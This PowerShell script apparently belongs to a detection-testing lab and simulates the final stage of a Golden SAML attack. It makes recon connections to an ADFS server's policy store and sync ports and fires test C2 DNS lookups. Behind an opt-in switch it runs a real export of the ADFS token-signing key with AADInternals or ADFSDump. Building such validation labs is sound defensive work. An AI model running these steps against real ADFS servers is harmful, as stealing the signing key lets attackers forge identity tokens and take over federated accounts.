<#
    Stage 5 (END) - ADFS config sync (Golden SAML preparation)
    ==========================================================
    The attacker reaches the ADFS configuration/policy store from a host that is
    NOT an ADFS server - the recon step before stealing the token-signing
    certificate for a Golden SAML forgery.

      EAL alert : 'Unusual ADFS Remote Synchronization network connections from
                   non-ADFS server'  (rule - ITDR)
      ATT&CK    : Credential Access / Lateral Movement (TA0006/TA0008) /
                  Forge Web Credentials: SAML Tokens (T1606.002), T1210
#>
param([switch]$DryRun, [switch]$EnableRealExploits)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
. "$PSScriptRoot\_exploit.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }
if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }

$adfs = $cfg.AdfsServer
Write-Stage "STAGE 5 (END): ADFS remote-sync connections to $adfs (from non-ADFS host)" "INFO"
Invoke-Http -Url "http://$adfs/adfs/services/policystoretransfer" -Label "policy store transfer"
Invoke-Http -Url "http://$adfs/FederationMetadata/2007-06/FederationMetadata.xml" -Label "ADFS metadata"
foreach ($p in @(808, 445)) {
    if ($cfg.DryRun) { Write-Host "  DRY: connect ${adfs}:$p (ADFS sync / WID)"; continue }
    $ok = Test-NetConnection -ComputerName $adfs -Port $p -InformationLevel Quiet -WarningAction SilentlyContinue
    Write-Stage "  ADFS sync port ${p} -> $([string]$ok)" "OK"
}
# Firewall anchor: the stolen token-signing certificate is exfiltrated.
Invoke-TestDns -Category "dns-infiltration"
Invoke-TestDns -Category "c2"

# --- OPT-IN real Golden SAML prerequisite (operator tool only) -------------
# The connections above are recon only. The real Golden SAML prerequisite is
# exporting the ADFS token-signing key from the lab ADFS - done ONLY by the
# operator's tool, never by code here. Prefer the AADInternals module; else
# ADFSDump.exe in scripts\tools\. NOTE: this requires LOCAL access to the lab
# ADFS server and performs a REAL signing-key export. Forging the SAML token is
# the operator's next step (not performed here). No key is ever fabricated.
Invoke-RealExploit -Name 'ADFS token-signing key export (Golden SAML prep)' `
    -Module 'AADInternals' -ToolCandidates @('ADFSDump.exe') `
    -TrafficNote 'ADFS recon connections were made (no key export).' `
    -Run {
        param($resolved)
        if ($resolved -eq 'AADInternals') {
            Import-Module AADInternals
            # Real export of the ADFS token-signing certificate/key from the lab ADFS.
            Export-AADIntADFSSigningCertificate
            Write-Stage "  AADInternals exported the ADFS token-signing key; forging the SAML token is the operator's next step." "BLOCK"
        } else {
            & $resolved
        }
    }

Write-Stage "STAGE 5 done. Expect FW NGFW: DNS-Security dns-infiltration/C2 + (ITDR/baseline) EAL 'Unusual ADFS Remote Synchronization'." "OK"
